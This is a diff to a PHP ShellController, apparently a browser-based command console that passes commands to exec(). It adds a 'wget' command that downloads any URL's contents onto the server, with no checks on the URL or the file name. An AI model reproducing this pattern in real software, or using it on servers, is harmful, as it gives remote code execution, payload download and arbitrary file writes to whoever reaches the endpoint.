@@ -51,7 +51,11 @@ class ShellController extends Controller
             chdir($cwd);
             preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
             return $this->featureDownload($match[1]);
-        } else {
+        }elseif (preg_match("/^\s*wget\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
+            preg_match("/^\s*wget\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
+            return $this->featureWget($match[1]);
+            }
+        else {
             chdir($cwd);
             exec($cmd, $stdout);
         }
@@ -116,6 +120,29 @@ class ShellController extends Controller
                 'cwd' => getcwd()
             );
         }
+    }
+
+    function featureWget($path){
+$url=$path;
+        
+         $file_name = basename($url);
+    
+    // Use file_get_contents() function to get the file
+    // from url and use file_put_contents() function to
+    // save the file by using base name
+    if (file_put_contents($file_name, file_get_contents($url)))
+    {
+        $status= "File downloaded successfully";
+    }
+    else
+    {
+        $status= "File downloading failed.";
+    }
+
+           return array(
+                'stdout' => array('wget '. $status),
+                'cwd' => getcwd()
+            );
     }
 
 }
